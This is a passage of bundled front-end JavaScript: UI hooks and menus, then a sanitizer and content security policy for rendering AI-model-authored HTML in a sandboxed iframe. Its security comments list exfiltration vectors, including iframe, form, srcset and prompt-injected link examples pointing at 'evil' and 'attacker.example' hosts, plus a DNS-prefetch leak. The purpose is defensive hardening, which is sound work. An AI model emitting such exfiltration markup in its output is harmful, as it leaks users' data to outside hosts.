* using serialised settings (threshold/margin) as lookup keys.
*/
var observers = /* @__PURE__ */ new WeakMap();
var fireObserverCallback = (entry) => {
	const callback = observerCallbacks.get(entry.target);
	callback && callback(entry);
};
var fireAllObserverCallbacks = (entries) => {
	entries.forEach(fireObserverCallback);
};
function initIntersectionObserver({ root, ...options }) {
	const lookupRoot = root || document;
	/**
	* If we don't have an observer lookup map for this root, create one.
	*/
	if (!observers.has(lookupRoot)) observers.set(lookupRoot, {});
	const rootObservers = observers.get(lookupRoot);
	const key = JSON.stringify(options);
	/**
	* If we don't have an observer for this combination of root and settings,
	* create one.
	*/
	if (!rootObservers[key]) rootObservers[key] = new IntersectionObserver(fireAllObserverCallbacks, {
		root,
		...options
	});
	return rootObservers[key];
}
function observeIntersection(element, options, callback) {
	const rootInteresectionObserver = initIntersectionObserver(options);
	observerCallbacks.set(element, callback);
	rootInteresectionObserver.observe(element);
	return () => {
		observerCallbacks.delete(element);
		rootInteresectionObserver.unobserve(element);
	};
}
// node_modules/framer-motion/dist/es/motion/features/viewport/index.mjs
var thresholdNames = {
	some: 0,
	all: 1
};
var InViewFeature = class extends Feature {
	constructor() {
		super(...arguments);
		this.hasEnteredView = false;
		this.isInView = false;
	}
	startObserver() {
		this.stopObserver?.();
		const { viewport = {} } = this.node.getProps();
		const { root, margin: rootMargin, amount = "some", once } = viewport;
		const options = {
			root: root ? root.current : void 0,
			rootMargin,
			threshold: typeof amount === "number" ? amount : thresholdNames[amount]
		};
		const onIntersectionUpdate = (entry) => {
			const { isIntersecting } = entry;
			/**
			* If there's been no change in the viewport state, early return.
			*/
			if (this.isInView === isIntersecting) return;
			this.isInView = isIntersecting;
			/**
			* Handle hasEnteredView. If this is only meant to run once, and
			* element isn't visible, early return. Otherwise set hasEnteredView to true.
			*/
			if (once && !isIntersecting && this.hasEnteredView) return;
			else if (isIntersecting) this.hasEnteredView = true;
			if (this.node.animationState) this.node.animationState.setActive("whileInView", isIntersecting);
			/**
			* Use the latest committed props rather than the ones in scope
			* when this observer is created
			*/
			const { onViewportEnter, onViewportLeave } = this.node.getProps();
			const callback = isIntersecting ? onViewportEnter : onViewportLeave;
			callback && callback(entry);
		};
		this.stopObserver = observeIntersection(this.node.current, options, onIntersectionUpdate);
	}
	mount() {
		this.startObserver();
	}
	update() {
		if (typeof IntersectionObserver === "undefined") return;
		const { props, prevProps } = this.node;
		if ([
			"amount",
			"margin",
			"root"
		].some(hasViewportOptionChanged(props, prevProps))) this.startObserver();
	}
	unmount() {
		this.stopObserver?.();
		this.hasEnteredView = false;
		this.isInView = false;
	}
};
function hasViewportOptionChanged({ viewport = {} }, { viewport: prevViewport = {} } = {}) {
	return (name) => viewport[name] !== prevViewport[name];
}
// node_modules/framer-motion/dist/es/motion/features/gestures.mjs
var gestureAnimations = {
	inView: { Feature: InViewFeature },
	tap: { Feature: PressGesture },
	focus: { Feature: FocusGesture },
	hover: { Feature: HoverGesture }
};
// node_modules/framer-motion/dist/es/motion/features/layout.mjs
var layout = { layout: {
	ProjectionNode: HTMLProjectionNode,
	MeasureLayout
} };
// node_modules/framer-motion/dist/es/render/components/motion/proxy.mjs
var motion = /*@__PURE__*/ createMotionProxy({
	...animations,
	...gestureAnimations,
	...drag,
	...layout
}, createDomVisualElement);
// node_modules/framer-motion/dist/es/utils/reduced-motion/use-reduced-motion.mjs
/**
* A hook that returns `true` if we should be using reduced motion based on the current device's Reduced Motion setting.
*
* This can be used to implement changes to your UI based on Reduced Motion. For instance, replacing motion-sickness inducing
* `x`/`y` animations with `opacity`, disabling the autoplay of background videos, or turning off parallax motion.
*
* It will actively respond to changes and re-render your components with the latest setting.
*
* ```jsx
* export function Sidebar({ isOpen }) {
*   const shouldReduceMotion = useReducedMotion()
*   const closedX = shouldReduceMotion ? 0 : "-100%"
*
*   return (
*     <motion.div animate={{
*       opacity: isOpen ? 1 : 0,
*       x: isOpen ? 0 : closedX
*     }} />
*   )
* }
* ```
*
* @return boolean
*
* @public
*/
function useReducedMotion() {
	/**
	* Lazy initialisation of prefersReducedMotion
	*/
	!hasReducedMotionListener.current && initPrefersReducedMotion();
	const [shouldReduceMotion] = useState(prefersReducedMotion.current);
	/**
	* TODO See if people miss automatically updating shouldReduceMotion setting
	*/
	return shouldReduceMotion;
}
// src/host/settingsPath.ts
/**
* The dashboard's Settings route for a tab (`website/src/components/settingsPath.ts`,
* reduced to the tab form this page links to). A dashboard route, not an App Kit
* seam (PORTING.md).
*/
function settingsPath(target) {
	const tab = target.tab.trim();
	return tab ? `/settings/${encodeURIComponent(tab)}` : "/settings";
}
// src/host/useMenuKeyboard.ts
/**
* The keyboard contract for `role="menu"` surfaces (WAI-ARIA menu pattern),
* restated from the dashboard's `hooks/useMenuKeyboard.ts`: ArrowDown/ArrowUp
* move focus between the enabled items and wrap, Home/End jump to the ends, and
* Tab/Shift-Tab are contained in the items. Escape is the host's own.
*
* The dashboard's version shares a document-level IME latch; here a key that is
* part of a composition (`isComposing`, or the 229 key code a WebKit IME sends)
* is left alone, which is the same outcome for the keys this contract handles.
*/
/** The enabled, keyboard-reachable rows of a menu container. */
function menuItemsOf(container) {
	if (!container) return [];
	return Array.from(container.querySelectorAll("[role=\"menuitem\"],[role=\"menuitemradio\"],[role=\"menuitemcheckbox\"],[role=\"button\"],button")).filter((el) => !el.hasAttribute("disabled") && el.getAttribute("aria-disabled") !== "true");
}
function composing(e) {
	return e.isComposing || e.keyCode === 229;
}
/** Handle one keydown against the menu contract; true when the key was consumed. */
function handleMenuKeydown(e, getItems) {
	if (e.key === "ArrowDown" || e.key === "ArrowUp" || e.key === "Home" || e.key === "End") {
		if (e.altKey || e.ctrlKey || e.metaKey) return false;
		const focusable = getItems();
		if (focusable.length === 0) return false;
		if (composing(e)) return true;
		e.preventDefault();
		if (e.key === "Home") {
			focusable[0].focus();
			return true;
		}
		if (e.key === "End") {
			focusable[focusable.length - 1].focus();
			return true;
		}
		const idx = focusable.indexOf(document.activeElement);
		focusable[idx === -1 ? e.key === "ArrowDown" ? 0 : focusable.length - 1 : (idx + (e.key === "ArrowDown" ? 1 : -1) + focusable.length) % focusable.length].focus();
		return true;
	}
	if (e.key !== "Tab") return false;
	const focusable = getItems();
	if (focusable.length === 0) return false;
	const first = focusable[0];
	const last = focusable[focusable.length - 1];
	if (e.shiftKey && document.activeElement === first) {
		if (composing(e)) return true;
		e.preventDefault();
		last.focus();
		return true;
	}
	if (!e.shiftKey && document.activeElement === last) {
		if (composing(e)) return true;
		e.preventDefault();
		first.focus();
		return true;
	}
	return false;
}
function isEditableElement(el) {
	if (!el) return false;
	if (el instanceof HTMLTextAreaElement) return true;
	if (el instanceof HTMLInputElement) return ![
		"button",
		"checkbox",
		"radio",
		"submit",
		"reset"
	].includes(el.type);
	return el.isContentEditable === true;
}
/** Wire an open `role="menu"` container onto the menu keyboard contract. */
function useMenuKeyboard(opts) {
	const { enabled, containerRef, focusFirstOnOpen = true } = opts;
	useEffect(() => {
		if (!enabled) return;
		const items = () => menuItemsOf(containerRef.current);
		if (focusFirstOnOpen) items()[0]?.focus();
		const onKey = (e) => {
			const active = document.activeElement;
			if (active && !containerRef.current?.contains(active) && isEditableElement(active)) return;
			handleMenuKeydown(e, items);
		};
		document.addEventListener("keydown", onKey);
		return () => document.removeEventListener("keydown", onKey);
	}, [
		enabled,
		focusFirstOnOpen,
		containerRef
	]);
}
// src/host/useEscapeLayer.ts
var ESCAPE_PRIORITY = {
	composer: 0,
	flyout: 10
};
var layers = [];
var nextSeq = 0;
function onKeyDown(e) {
	if (e.key !== "Escape" || e.defaultPrevented) return;
	const ordered = [...layers].sort((a, b) => b.priority - a.priority || b.seq - a.seq);
	for (const layer of ordered) {
		const verdict = layer.handle(e);
		if (verdict === "pass") continue;
		if (verdict === "take") {
			e.preventDefault();
			e.stopPropagation();
		}
		return;
	}
}
function push(layer) {
	if (layers.length === 0) document.addEventListener("keydown", onKeyDown, true);
	layers.push(layer);
	return () => {
		const i = layers.indexOf(layer);
		if (i >= 0) layers.splice(i, 1);
		if (layers.length === 0) document.removeEventListener("keydown", onKeyDown, true);
	};
}
function useEscapeLayer(active, onEscape, priority = 0) {
	const handler = useRef(onEscape);
	handler.current = onEscape;
	useEffect(() => {
		if (!active) return;
		return push({
			seq: ++nextSeq,
			priority,
			handle: (e) => handler.current(e) ?? "take"
		});
	}, [active, priority]);
}
// src/host/dropdownMenu.tsx
/**
* The overflow menu this page used from the dashboard's
* `components/ui/dropdown-menu.tsx` (a Radix menu). That component is not part of
* the App Kit, so this is a small local menu with the same API surface the page
* uses (`DropdownMenu`, `DropdownMenuTrigger asChild`, `DropdownMenuContent
* align`, `DropdownMenuItem onSelect disabled`, `DropdownMenuSeparator`) and the
* same behaviour a user meets: the trigger toggles a `role="menu"` list, focus
* enters it, the arrow keys move and wrap, Escape and an outside press close it
* and give focus back to the trigger, and choosing an item closes it.
*/
var MenuCtx = createContext(null);
function useMenu() {
	const state = useContext(MenuCtx);
	if (!state) throw new Error("DropdownMenu parts must sit inside <DropdownMenu>");
	return state;
}
function DropdownMenu({ children }) {
	const [open, setOpen] = useState(false);
	const menuId = useId();
	const triggerRef = useRef(null);
	const value = useMemo(() => ({
		open,
		setOpen,
		menuId,
		triggerRef
	}), [open, menuId]);
	return /* @__PURE__ */ jsx(MenuCtx.Provider, {
		value,
		children: /* @__PURE__ */ jsx("span", {
			className: "relative inline-flex",
			children
		})
	});
}
function DropdownMenuTrigger({ asChild, children }) {
	const { open, setOpen, menuId, triggerRef } = useMenu();
	const props = {
		"aria-haspopup": "menu",
		"aria-expanded": open,
		"aria-controls": open ? menuId : void 0,
		"data-state": open ? "open" : "closed",
		onClick: (e) => {
			(isValidElement(children) ? children.props.onClick : void 0)?.(e);
			if (!e.defaultPrevented) setOpen(!open);
		},
		ref: (el) => {
			triggerRef.current = el;
		}
	};
	if (asChild && isValidElement(children)) return cloneElement(children, props);
	return /* @__PURE__ */ jsx("button", {
		type: "button",
		...props,
		children
	});
}
function DropdownMenuContent({ align = "start", className = "", children }) {
	const { open, setOpen, menuId, triggerRef } = useMenu();
	const listRef = useRef(null);
	const close = useCallback(() => {
		setOpen(false);
		triggerRef.current?.focus();
	}, [setOpen, triggerRef]);
	useMenuKeyboard({
		enabled: open,
		containerRef: listRef
	});
	useEscapeLayer(open, () => {
		close();
		return "take";
	}, ESCAPE_PRIORITY.flyout);
	useEffect(() => {
		if (!open) return;
		const onDown = (e) => {
			const target = e.target;
			if (!target) return;
			if (listRef.current?.contains(target) || triggerRef.current?.contains(target)) return;
			setOpen(false);
		};
		document.addEventListener("pointerdown", onDown, true);
		return () => document.removeEventListener("pointerdown", onDown, true);
	}, [
		open,
		setOpen,
		triggerRef
	]);
	if (!open) return null;
	return /* @__PURE__ */ jsx("div", {
		ref: listRef,
		id: menuId,
		role: "menu",
		"data-state": "open",
		className: `absolute top-full mt-1 z-50 rounded-md border border-border bg-card p-1 shadow-lg ${align === "end" ? "right-0" : "left-0"} ${className}`,
		children: /* @__PURE__ */ jsx(MenuCloseCtx.Provider, {
			value: close,
			children
		})
	});
}
var MenuCloseCtx = createContext(() => {});
function DropdownMenuItem({ disabled, onSelect, className = "", children }) {
	const close = useContext(MenuCloseCtx);
	return /* @__PURE__ */ jsx("div", {
		role: "menuitem",
		tabIndex: -1,
		"aria-disabled": disabled ? "true" : void 0,
		"data-disabled": disabled ? "" : void 0,
		className: `flex items-center gap-2 rounded px-2 py-1.5 text-[13px] outline-none cursor-pointer select-none hover:bg-hover focus:bg-hover ${disabled ? "opacity-50 pointer-events-none" : ""} ${className}`,
		onClick: () => {
			if (disabled) return;
			close();
			onSelect?.();
		},
		onKeyDown: (e) => {
			if (disabled || e.key !== "Enter" && e.key !== " ") return;
			e.preventDefault();
			close();
			onSelect?.();
		},
		children
	});
}
function DropdownMenuSeparator() {
	return /* @__PURE__ */ jsx("div", {
		role: "separator",
		className: "my-1 h-px bg-border"
	});
}
// src/host/ConfirmDialog.tsx
/**
* The page's async confirmation, restated from the dashboard's
* `components/ConfirmDialog.tsx` over the SDK's `Modal` and `Btn`: `confirm(opts)`
* resolves `true` only when the confirm button is pressed; Cancel, Escape, the X
* button and a backdrop click resolve `false`. A second ask while one is open
* answers the first "no", and an unmount answers "no". The dashboard's guide
* marker on the confirm button is not an App Kit seam and is left off.
*/
function useConfirm() {
	const [pending, setPending] = useState(null);
	const pendingRef = useRef(null);
	const lastOptsRef = useRef(null);
	const confirm = useCallback((opts) => {
		return new Promise((resolve) => {
			pendingRef.current?.resolve(false);
			const next = {
				opts,
				resolve
			};
			pendingRef.current = next;
			lastOptsRef.current = opts;
			setPending(next);
		});
	}, []);
	const settle = useCallback((confirmed) => {
		pendingRef.current?.resolve(confirmed);
		pendingRef.current = null;
		setPending(null);
	}, []);
	useEffect(() => () => {
		pendingRef.current?.resolve(false);
		pendingRef.current = null;
	}, []);
	const opts = pending?.opts ?? lastOptsRef.current;
	const confirmDialog = opts ? /* @__PURE__ */ jsx(Modal, {
		open: !!pending,
		onClose: () => settle(false),
		title: opts.title,
		maxWidth: 440,
		footer: /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx(Btn, {
			onClick: () => settle(false),
			children: i18nT("components.confirmDialog.cancel")
		}), /* @__PURE__ */ jsx(Btn, {
			danger: !opts.primary && opts.danger !== false,
			primary: opts.primary,
			onClick: () => settle(true),
			children: opts.confirmLabel
		})] }),
		children: opts.body == null ? null : typeof opts.body === "string" ? /* @__PURE__ */ jsx("p", {
			className: "text-sm text-text m-0",
			children: opts.body
		}) : /* @__PURE__ */ jsx("div", {
			className: "text-sm text-text",
			children: opts.body
		})
	}) : null;
	return {
		confirm,
		cancel: useCallback(() => settle(false), [settle]),
		confirmDialog,
		confirmOpen: !!pending
	};
}
// src/host/MarkdownRenderer.tsx
/** The folder of *filePath*, with forward slashes. */
function folderOf(filePath) {
	const normalized = filePath.replace(/\\/g, "/");
	const cut = normalized.lastIndexOf("/");
	return cut > 0 ? normalized.slice(0, cut) : normalized;
}
var RELATIVE_IMAGE = /(!\[[^\]\n]*\]\()(<)?(?![a-zA-Z][a-zA-Z0-9+.-]*:|\/|~|#)([^)\s>]+)(>)?/g;
/**
* *markdown* with every relative image destination made absolute against the
* folder of *filePath*. URLs, root and home paths, and fragments are untouched.
*/
function resolveRelativeImages(markdown, filePath) {
	if (!filePath) return markdown;
	const folder = folderOf(filePath);
	return markdown.replace(RELATIVE_IMAGE, (_whole, head, open = "", dest, close = "") => {
		const clean = dest.startsWith("./") ? dest.slice(2) : dest;
		return `${head}${open}${folder}/${clean}${close}`;
	});
}
// src/lib/sketchSrcdoc.ts
/** The runtime's served path under this build's base (the bare path in the stock build). */
var MERMAID_RUNTIME_PATH = withBase("/vendor/mermaid.min.js");
/**
* CSP for the sketch frame. `scriptOrigin` is the dashboard's own origin
* (`window.location.origin`) — a null-origin document cannot use `'self'`, so
* the origin is spelled out.
*
* Each directive, and why it is exactly this:
*
* - `default-src 'none'` — start from deny-everything so any fetch type we
*   forget to name (media, object, worker, manifest, prefetch, **frame**) is
*   denied by fallback. `frame-src` is deliberately ABSENT for this reason: an
*   `<iframe src="https://evil/?d=…">` is just as good an exfil channel as an
*   image, and inheriting `'none'` blocks it without another directive to keep
*   in sync.
* - `script-src 'unsafe-inline' <origin><MERMAID_RUNTIME_PATH>` — pinned to the
*   single vendored FILE, not to a bare origin and not to `https:`. Same
*   least-privilege shape as `widgetSrcdoc.cspFor` pinning Tailwind: an injected
*   document cannot pull arbitrary scripts from other dashboard endpoints, and
*   crucially a script URL is itself an egress channel, so `script-src https:`
*   would reopen the finding. `'unsafe-inline'` stays because OUR OWN inline
*   bootstrap (`MERMAID_BOOTSTRAP_BODY`) is what drives Mermaid, and a `srcdoc`
*   document has no response header to carry a nonce. Note what it no longer
*   covers: the model's inline scripts are REMOVED from the document before it is
*   serialized (`scrubModelDocument`), so `'unsafe-inline'` is a grant to our
*   code, not to the model's. Replacing it with a build-time hash of that one
*   literal is the follow-up that would retire the grant entirely.
*   `'unsafe-eval'` is NOT granted — the vendored bundle contains zero
*   `eval(` / `new Function` / `new Worker` / `importScripts` (verified against
*   mermaid 11.13.0's `mermaid.min.js`), so the frame gets no dynamic-exec
*   primitive.
* - `style-src 'unsafe-inline'` — Mermaid injects a `<style>` block inside the
*   SVG it renders, and both Mermaid and the agent's tables use `style=`
*   attributes. No origin: a stylesheet URL is also an egress channel.
* - `img-src data:` — **this and `connect-src` are the two directives that close
*   the finding.** The reported repro is an HTTPS image URL, so `img-src` grants
*   NO `https:` and no origin: only inline `data:` images can load. `blob:` is
*   deliberately omitted — the vendored bundle never calls
*   `URL.createObjectURL`, so Mermaid does not need it. (Note `img-src` also
*   governs CSS `background: url(…)`, closing that variant too.)
* - `font-src data:` — an inline `@font-face` is harmless (no network), a remote
*   one is an egress channel. Mermaid itself needs no webfont.
* - `connect-src 'none'` — kills `fetch`, `XMLHttpRequest`, WebSocket,
*   `EventSource` and `navigator.sendBeacon` in one directive. The frame needs
*   no network at all now that Mermaid is same-origin, so it is granted none.
* - `form-action 'none'` — `form-action` does NOT fall back to `default-src`, so
*   without it an auto-submitting `<form action="https://evil">` would exfil by
*   navigation.
* - `base-uri 'none'` — a `<base href>` would re-point every relative URL in the
*   document, including the Mermaid script path, at an attacker origin.
*/
var cspFor = (scriptOrigin) => `default-src 'none'; script-src 'unsafe-inline' ${scriptOrigin}${MERMAID_RUNTIME_PATH}; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none';`;
/** Frame chrome only. Kept deliberately small so it cannot fight the agent's
* own styling: page padding, a readable default face, and a rule that keeps a
* wide diagram inside the panel instead of forcing a horizontal scrollbar. */
var BASE_CSS = "body { margin: 0; padding: 16px; background: #fff; color: #1a1a1a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; } .mermaid { display: flex; justify-content: center; } .mermaid svg { max-width: 100%; height: auto; }";
/**
* In-frame Mermaid bootstrap. A fixed string literal — it interpolates NOTHING
* (no `${}` at all), so no model or user byte can ever reach it. Assigned via
* `textContent` and re-parsed by the frame through the normal `<script>`
* mechanism.
*
* Init approach, and why:
*
* - `startOnLoad: false` + an explicit `mermaid.run()`. Mermaid registers its
*   OWN `window.load` handler at script-eval time, and its default config has
*   `startOnLoad: true` — so doing nothing would auto-render, but would race our
*   `initialize()` call and could render with mermaid's defaults instead of
*   ours. `suppressErrorRendering` is not a nicety: without it a parse error
*   injects a temp `<div id="dmermaid-*">` into `document.body` that render()
*   only cleans up on SUCCESS, so failing blocks accumulate orphaned 512px error
*   SVGs (see src/test/MarkdownRenderer.mermaid.test.tsx — this is a real
*   regression, kept in sync with `initMermaid` in
*   src/components/markdown/MermaidBlock.tsx). Being
*   explicit is the only way to guarantee that setting is applied.
* - `suppressErrors: true` on `run()` because `run()` rethrows the first error
*   otherwise, so one malformed diagram would abort every later one. Combined
*   with `suppressErrorRendering`, a bad block degrades to showing its own
*   source text and nothing leaks into the DOM.
* - `securityLevel: 'strict'` matches MarkdownRenderer: the diagram source is
*   model-authored, so HTML labels and click handlers stay off.
* - We run at `DOMContentLoaded` (or immediately if parsing already finished),
*   which is earlier than mermaid's own `load` hook and does not wait on images.
* - `promote()` normalizes a fenced ```mermaid block — which reaches us as
*   `<pre><code class="language-mermaid">` — into the plain `div.mermaid` that
*   mermaid's selector expects. Mermaid reads `innerHTML` and entity-decodes it,
*   so leaving the `<code>` wrapper in place would feed markup to the parser and
*   guarantee a parse error. `textContent` extraction avoids that.
* - Re-running is safe: mermaid marks handled nodes `data-processed`, so a second
*   `run()` (ours or mermaid's own `startOnLoad` hook) renders nothing twice.
*
* This bootstrap is now the ONLY thing that renders a diagram: the model's own
* `<script>` elements are stripped by `scrubModelDocument`, so a document written
* in the old CDN idiom (`<script src="…cdn…/mermaid">` then
* `mermaid.initialize({startOnLoad:true})`) no longer runs its half — and does
* not need to, because the declarative `div.mermaid` / fenced-block markup it
* wrote around that script is exactly what `promote()` + `run()` pick up.
*/
var MERMAID_BOOTSTRAP_BODY = `(function(){
  var m = window.mermaid;
  if (!m) return;
  function promote(){
    var nodes = document.querySelectorAll('code.language-mermaid, code.mermaid, pre.mermaid > code');
    for (var i = 0; i < nodes.length; i++){
      var code = nodes[i];
      var host = code.closest('pre') || code;
      var div = document.createElement('div');
      div.className = 'mermaid';
      div.textContent = code.textContent || '';
      if (host.parentNode) host.parentNode.replaceChild(div, host);
    }
  }
  function start(){
    try { promote(); } catch (e) {}
    try {
      m.initialize({
        startOnLoad: false,
        securityLevel: 'strict',
        suppressErrorRendering: true,
        fontFamily: 'inherit',
        theme: 'default'
      });
    } catch (e) {}
    try { m.run({ querySelector: '.mermaid', suppressErrors: true }); } catch (e) {}
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
  else start();
})();`;
/**
* Elements removed outright from the model document. Every one of them is
* either a script host or a navigation/fetch primitive that would fire before
* or around the CSP, and NONE of them is reachable from the agent's documented
* output (Mermaid blocks + HTML/CSS tables).
*
* - `script` — the root cause. Its removal is what closes the DNS channel; see
*   the file header. Covers SVG `<script>` too: `querySelectorAll('script')`
*   matches on local name, and SVG's script element has the same one.
* - `iframe` / `frame` — `srcdoc` is a full nested document, so an `<iframe
*   srcdoc="<script>…">` re-introduces script execution one level down where
*   this scrub has not run. `src` is separately an egress channel.
* - `object` / `embed` / `applet` — plugin/document hosts: `<object
*   data="…">` both fetches and can host a scripted document.
* - `link` — **decision: EVERY `<link>` goes, not just the speculative rels.**
*   The narrow fix would be to drop `rel` values in {`dns-prefetch`,
*   `preconnect`, `prefetch`, `prerender`, `preload`, `modulepreload`}, matching
*   `rel` case-insensitively and token-wise (`rel="foo dns-prefetch"` is a hit).
*   Dropping the element outright is both simpler and strictly safer, and it
*   costs nothing here because NO `rel` has a legitimate use in this frame:
*   `stylesheet` is already dead (`style-src 'unsafe-inline'` names no origin, so
*   a remote sheet cannot load, and the agent is told to use inline styles);
*   `icon`/`apple-touch-icon` are meaningless in a 340px panel and would need an
*   `img-src` origin we do not grant; `manifest`, `import` and `search` all fall
*   under `default-src 'none'`. So a surviving `<link>` could only ever be a
*   no-op or a channel. A rel-allowlist would also mean maintaining a token list
*   forever against a spec that keeps adding speculative rels — the exact failure
*   mode this finding came from. Element-level removal has no such list.
* - `meta` — the only reason a model document needs a `<meta>` is charset or
*   viewport, and we already emit both. What it must not be able to emit is
*   `http-equiv="refresh"` (navigates the frame to an attacker URL, exfiltrating
*   by navigation — `form-action 'none'` does not cover a redirect) or a second
*   `http-equiv="Content-Security-Policy"` (a policy cannot be loosened by a
*   later meta, but it removes any doubt).
* - `base` — repoints every relative URL, including our Mermaid script path.
*   `base-uri 'none'` already refuses it; removing it means we do not depend on
*   the meta-CSP having bound yet.
* - `template` — its `.content` is an inert DocumentFragment that
*   `querySelectorAll` on the host document does NOT descend into, so a
*   `<template><script>…<\/script></template>` would sail through an
*   attribute/element walk and then execute the moment anything clones it.
*   Nothing in a diagram or a table needs one, so it goes.
* - `noscript` — with scripting enabled its children are parsed as TEXT, so it
*   is inert in the real frame; but happy-dom (and DOMParser) expose the inner
*   `<script>` as an element, and relying on a per-engine parsing difference for
*   a security property is exactly the kind of reasoning that produced the bug
*   in the file header. Removed so both engines agree.
*/
var STRIPPED_TAGS = [
	"script",
	"iframe",
	"frame",
	"object",
	"embed",
	"applet",
	"link",
	"meta",
	"base",
	"template",
	"noscript"
];
/**
* URL-bearing attributes whose VALUE is scheme-checked on every surviving
* element. They are dropped only when `isUnsafeUrl` says the scheme itself can
* execute — so a legitimate `href="#anchor"` in a diagram label, or an
* `src="data:image/png;base64,…"`, survives.
*
* This pass is deliberately narrow, because the two threats are handled by
* different mechanisms and conflating them is how you end up with an endless
* denylist:
*
*   * A URL that EXECUTES (`javascript:`, `vbscript:`, `data:text/html`) is not
*     a fetch at all, so no CSP directive stops it. That is what this pass is
*     for.
*   * A URL that merely REACHES THE NETWORK (`srcset="https://evil/x 1x"`,
*     `<a ping>`, `poster`, a remote SVG `use href`) is a fetch, and the CSP
*     already refuses it: `default-src 'none'` with only `img-src data:` /
*     `font-src data:` / `connect-src 'none'` granted means there is no
*     directive under which a remote sub-resource can load. Those values are
*     therefore left alone rather than pattern-matched here — one deny-all
*     policy beats a list of URL attributes we would have to keep current.
*/
var URL_ATTRS = [
	"href",
	"xlink:href",
	"src",
	"srcset",
	"data",
	"action",
	"formaction",
	"ping",
	"poster",
	"background",
	"codebase"
];
/** Values of `<animate attributeName>` / `<set attributeName>` that would let
* SVG animation WRITE a scrubbed URL attribute back onto its parent after the
* scrub ran. The animation elements are kept (they are legitimate SVG), but an
* animation that targets a URL attribute is dropped. */
var ANIMATABLE_URL_TARGETS = /* @__PURE__ */ new Set(["href", "xlink:href"]);
/**
* True for a URL value whose SCHEME can execute script — the one class of URL no
* CSP fetch directive covers, because it is a navigation/eval, not a fetch.
*
* `data:` is refused on the same grounds: a `data:text/html,<script>…`
* navigation is script execution. `data:image/*` is the one form the CSP
* explicitly permits (`img-src data:`), so it passes.
*/
/**
* Attributes that can NAVIGATE, as opposed to fetching a sub-resource.
*
* These get a stricter rule than `isUnsafeUrl`: fragment-only, or dropped. The
* reasoning in `URL_ATTRS` above — "a URL that merely reaches the network is a
* fetch, and `default-src 'none'` already refuses it" — is correct for a
* sub-resource and WRONG for a navigation. No CSP directive governs where a
* top-level navigation may go: `form-action` covers form submission only,
* `default-src` does not apply, and `navigate-to` was dropped from the spec and
* never shipped. The frame is `sandbox="allow-scripts"` without
* `allow-top-navigation`, so it cannot move the dashboard — but it CAN navigate
* itself, and the request carries whatever the model put in the path.
*
* So a prompt-injected `<a href="https://attacker.example/<meeting text>">`
* styled as a diagram label is a live exfiltration channel that survives every
* other control here, needing only a click. The file already recognises exactly
* this shape for `<meta http-equiv="refresh">` ("exfiltrating by navigation —
* `form-action 'none'` does not cover a redirect"); this is the same hole reached
* through an ordinary link.
*
* Fragment refs are kept because Mermaid's own output uses them (`href="#id"`
* on nodes, `xlink:href` into `<defs>`), and a bare `#fragment` cannot resolve
* anywhere but this document.
*/
var NAVIGABLE_ATTRS = /* @__PURE__ */ new Set(["href", "xlink:href"]);
/** True for a value that can only ever resolve inside this document. */
var isFragmentOnly = (value) => /^#\S*$/.test(value.replace(/[\x00-\x20\x7f]+/g, ""));
function isUnsafeUrl(value) {
	const stripped = value.replace(/[\x00-\x20\x7f]+/g, "").toLowerCase();
	if (stripped.startsWith("javascript:") || stripped.startsWith("vbscript:")) return true;
	if (stripped.startsWith("data:") && !stripped.startsWith("data:image/")) return true;
	return false;
}
/**
* Remove script execution and speculative/navigational fetch primitives from the
* model-authored fragment, in place.
*
* This is the ROOT-CAUSE fix for the DNS-prefetch exfiltration finding: with no
* model script running, there is no `document.createElement('link')` to defeat a
* static markup strip, and the static strip below then closes the declarative
* form of the same channel.
*
* Order matters: `STRIPPED_TAGS` are removed BEFORE the attribute pass, so the
* attribute walk never has to reason about an element that is about to disappear.
* `<template>` is removed as an element (its `.content` fragment is not visited
* by `querySelectorAll` on the host, so scrubbing inside it would be wasted
* work — and leaving it in place would be a hole).
*/
function scrubModelDocument(root) {
	for (const el of Array.from(root.querySelectorAll(STRIPPED_TAGS.join(",")))) el.remove();
	for (const el of Array.from(root.querySelectorAll("*"))) for (const attr of Array.from(el.attributes)) {
		const name = attr.name.toLowerCase();
		if (name.startsWith("on")) {
			el.removeAttribute(attr.name);
			continue;
		}
		if (NAVIGABLE_ATTRS.has(name)) {
			if (!isFragmentOnly(attr.value)) el.removeAttribute(attr.name);
			continue;
		}
		if (URL_ATTRS.includes(name) && isUnsafeUrl(attr.value)) {
			el.removeAttribute(attr.name);
			continue;
		}
		if (name === "attributename" && ANIMATABLE_URL_TARGETS.has(attr.value.trim().toLowerCase())) el.removeAttribute(attr.name);
	}
}
/**
* Build the `srcdoc` for the sketch artist's sandboxed iframe.
*
* @param html        The model-authored document. NEVER interpolated.
* @param scriptOrigin The dashboard's own origin, e.g. `window.location.origin`.
*   The frame is null-origin, so a bare `/vendor/...` path would not resolve
*   there and `'self'` is not usable in its CSP — both need the origin spelled
*   out. Callers in a non-browser context should pass `''`; the policy then
*   pins a path-only script source, which matches nothing, i.e. it fails CLOSED.
*
* MODEL HTML NEVER ENTERS A TEMPLATE LITERAL. It flows through
* `Range.createContextualFragment()` — a typed DOM API — is adopted as DOM
* nodes, and the finished document is serialized via
* `documentElement.outerHTML`. This is the same construction widgetSrcdoc.ts
* uses and for the same reason: string-concatenating untrusted HTML into a
* document template makes every escape sequence a potential structural break,
* including one that could split the CSP `content="…"` attribute. The only
* template literal that survives here is the static DOCTYPE prefix.
*
* INJECTION-ORDER GUARANTEE: the CSP meta is inserted as the FIRST child of
* `<head>` and therefore precedes the Mermaid `<script src>`, our bootstrap, the
* base stylesheet, and every byte of the model document (all of which live in
* `<body>`, after the head). A `<meta>` CSP only binds from where it is parsed,
* so anything allowed to parse ahead of it — an `<img>`, a `<script>`, an
* auto-submitting `<form>` — would fire under NO policy. Keep the insert last in
* this function and first in the head.
*/
function buildSketchSrcdoc(html, scriptOrigin) {
	const doc = document.implementation.createHTMLDocument("");
	const head = doc.head;
	const body = doc.body;
	const charset = doc.createElement("meta");
	charset.setAttribute("charset", "utf-8");
	head.appendChild(charset);
	const viewport = doc.createElement("meta");
	viewport.setAttribute("name", "viewport");
	viewport.setAttribute("content", "width=device-width, initial-scale=1");
	head.appendChild(viewport);
	const style = doc.createElement("style");
	style.textContent = BASE_CSS;
	head.appendChild(style);
	const mermaidPlaceholder = doc.createElement("meta");
